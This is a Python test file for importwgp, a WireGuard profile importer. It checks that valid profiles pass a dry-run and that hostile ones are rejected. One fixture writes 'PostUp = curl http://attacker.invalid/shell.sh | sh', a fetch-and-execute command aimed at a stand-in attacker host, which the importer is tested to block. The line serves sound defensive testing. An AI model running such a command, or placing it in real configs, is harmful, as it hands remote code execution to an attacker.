#!/usr/bin/env python3
"""Automated security & sanitization tests for files/usr/local/bin/importwgp."""

from __future__ import annotations

import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from src import configs


@unittest.skipIf(shutil.which("wg") is None, "wireguard-tools (wg) not installed")
class ImportwgpSanitizerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.script = configs.file_path("usr/local/bin/importwgp")

    def _gen_keypair(self) -> tuple[str, str]:
        priv = subprocess.run(
            ["wg", "genkey"], capture_output=True, text=True, check=True
        ).stdout.strip()
        pub = subprocess.run(
            ["wg", "pubkey"], input=priv + "\n", capture_output=True, text=True, check=True
        ).stdout.strip()
        return priv, pub

    def test_dry_run_import_accepts_valid_profile_and_strips_dns_and_ipv6(self) -> None:
        priv, pub = self._gen_keypair()
        with tempfile.TemporaryDirectory() as tmp:
            conf = Path(tmp) / "sg-proton.conf"
            conf.write_text(
                f"[Interface]\n"
                f"# Label: SG-Proton#12\n"
                f"PrivateKey = {priv}\n"
                f"Address = 10.2.0.2/32, 2001:db8::2/128\n"
                f"DNS = 10.2.0.1\n"
                f"MTU = 1420\n\n"
                f"[Peer]\n"
                f"PublicKey = {pub}\n"
                f"AllowedIPs = 0.0.0.0/0, ::/0\n"
                f"Endpoint = 185.159.157.1:51820\n"
                f"PersistentKeepalive = 25\n",
                encoding="utf-8",
            )
            res = subprocess.run(
                [
                    "bash",
                    str(self.script),
                    "--dry-run",
                    "--yes",
                    "--import",
                    "--file",
                    str(conf),
                    "--name",
                    "sg-proton-12",
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(res.returncode, 0, msg=res.stderr + res.stdout)
            combined = res.stdout + res.stderr
            self.assertIn("sg-proton-12", combined)

    def test_rejects_postup_command_injection_and_symlinks(self) -> None:
        priv, pub = self._gen_keypair()
        with tempfile.TemporaryDirectory() as tmp:
            evil = Path(tmp) / "evil.conf"
            evil.write_text(
                f"[Interface]\n"
                f"PrivateKey = {priv}\n"
                f"Address = 10.2.0.2/32\n"
                f"PostUp = curl http://attacker.invalid/shell.sh | sh\n\n"
                f"[Peer]\n"
                f"PublicKey = {pub}\n"
                f"AllowedIPs = 0.0.0.0/0\n"
                f"Endpoint = 185.159.157.1:51820\n",
                encoding="utf-8",
            )
            res_evil = subprocess.run(
                ["bash", str(self.script), "--dry-run", "--import", "--file", str(evil)],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertNotEqual(res_evil.returncode, 0)
            self.assertIn("PostUp", res_evil.stderr + res_evil.stdout)

            sym = Path(tmp) / "sym.conf"
            sym.symlink_to(evil)
            res_sym = subprocess.run(
                ["bash", str(self.script), "--dry-run", "--import", "--file", str(sym)],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertNotEqual(res_sym.returncode, 0)
            self.assertIn("symlink", (res_sym.stderr + res_sym.stdout).lower())


if __name__ == "__main__":
    unittest.main()
